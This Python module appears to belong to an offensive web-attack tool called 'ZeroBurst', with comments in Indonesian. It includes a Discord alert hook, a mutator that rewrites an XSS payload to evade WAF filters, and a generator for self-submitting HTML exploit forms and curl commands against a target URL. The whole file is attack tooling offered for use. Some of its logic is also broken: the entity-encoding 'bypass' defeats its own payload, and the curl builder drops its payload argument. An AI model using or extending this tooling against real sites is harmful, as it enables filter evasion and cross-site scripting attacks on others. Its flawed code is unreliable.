import requests
import random
import string
import urllib.parse
import json
import os
from colorama import Fore, Style

# --- FITUR 1: REAL-TIME ALERT (DISCORD) ---
class DiscordNotifier:
    def __init__(self, webhook_url=None):
        # Default config file untuk menyimpan webhook
        self.config_file = "config_webhook.txt"
        self.webhook_url = webhook_url
        
        if not self.webhook_url and os.path.exists(self.config_file):
            with open(self.config_file, "r") as f:
                self.webhook_url = f.read().strip()

    def set_webhook(self):
        url = input(f"{Fore.YELLOW}[?] Enter Discord Webhook URL: {Style.RESET_ALL}")
        with open(self.config_file, "w") as f:
            f.write(url)
        self.webhook_url = url
        print(f"{Fore.GREEN}[+] Webhook saved!{Style.RESET_ALL}")
        self.send_alert("ZeroBurst System", "Notification System Online. Ready to hunt.")

    def send_alert(self, title, message, severity="INFO"):
        if not self.webhook_url: return
        
        color = 65280 # Green
        if severity == "CRITICAL": color = 16711680 # Red
        elif severity == "HIGH": color = 16753920 # Orange
        
        data = {
            "embeds": [{
                "title": f"⚡ {title}",
                "description": message,
                "color": color,
                "footer": {"text": "ZeroBurst Professional Framework"}
            }]
        }
        try:
            requests.post(self.webhook_url, json=data)
        except:
            pass

# --- FITUR 2: AI-BASED PAYLOAD MUTATION ---
class AIMutator:
    """
    Menggunakan logika Genetik sederhana untuk 'mengembangkan' payload
    agar bisa menembus filter WAF.
    """
    def __init__(self):
        self.mutations = [
            self._url_encode,
            self._double_url_encode,
            self._html_entity,
            self._sql_comment,
            self._whitespace_manipulation,
            self._case_toggle
        ]

    def _url_encode(self, payload):
        return urllib.parse.quote(payload)

    def _double_url_encode(self, payload):
        return urllib.parse.quote(urllib.parse.quote(payload))

    def _html_entity(self, payload):
        # <script> -> &lt;script&gt; (Bypass simple filters)
        return payload.replace("<", "&lt;").replace(">", "&gt;")

    def _sql_comment(self, payload):
        # UNION SELECT -> UNION/**/SELECT
        return payload.replace(" ", "/**/")

    def _whitespace_manipulation(self, payload):
        # Spasi jadi Tab atau Newline
        return payload.replace(" ", random.choice(["%09", "%0a", "%0d", "+"]))

    def _case_toggle(self, payload):
        # sCrIpT
        return "".join([c.upper() if random.randint(0,1) else c.lower() for c in payload])

    def generate_smart_payloads(self, base_payload, count=5):
        print(f"{Fore.MAGENTA}[AI] Mutating payload: {base_payload} ({count} variations)...{Style.RESET_ALL}")
        generated = []
        for _ in range(count):
            # Pilih teknik mutasi secara acak
            mutation_func = random.choice(self.mutations)
            new_pay = mutation_func(base_payload)
            generated.append(new_pay)
        return list(set(generated)) # Hapus duplikat

# --- FITUR 3: AUTO EXPLOIT (PoC GENERATOR) ---
class PoCGenerator:
    def generate_html_poc(self, target_url, method="GET", params=None):
        filename = f"poc_exploit_{random.randint(1000,9999)}.html"
        
        form_inputs = ""
        if params:
            for k, v in params.items():
                form_inputs += f'<input type="hidden" name="{k}" value="{v}" />\n'

        html = f"""
        <html>
        <body onload="document.forms[0].submit()">
            <h1>Exploiting Target...</h1>
            <form action="{target_url}" method="{method}">
                {form_inputs}
                <input type="submit" value="Click if not redirected">
            </form>
        </body>
        </html>
        """
        
        with open(filename, "w") as f:
            f.write(html)
        
        print(f"{Fore.GREEN}[+] PoC Generated: {filename}{Style.RESET_ALL}")
        return filename

    def generate_curl_command(self, target_url, payload):
        cmd = f"curl -v '{target_url}' -H 'User-Agent: ZeroBurst-Exploiter'"
        print(f"{Fore.GREEN}[+] Bash PoC: {cmd}{Style.RESET_ALL}")
        return cmd

# --- WRAPPER FUNCTIONS ---
def configure_notifications():
    notifier = DiscordNotifier()
    notifier.set_webhook()

def run_ai_fuzzer(url):
    ai = AIMutator()
    # Contoh Base Payload
    base = "<script>alert(1)</script>"
    mutated_list = ai.generate_smart_payloads(base, count=10)
    
    print(f"{Fore.CYAN}[*] AI Generated Attack Vectors:{Style.RESET_ALL}")
    for i, p in enumerate(mutated_list):
        print(f"   {i+1}. {p}")
    
    print(f"\n{Fore.YELLOW}[INFO] These payloads are ready to be fed into the Fuzzer.{Style.RESET_ALL}")

def generate_exploit(url):
    poc = PoCGenerator()
    print(f"{Fore.CYAN}[*] Generating Proof-of-Concept for: {url}{Style.RESET_ALL}")
    poc.generate_html_poc(url, "GET", {"test_param": "<script>alert(XSS)</script>"})
    poc.generate_curl_command(url, "payload")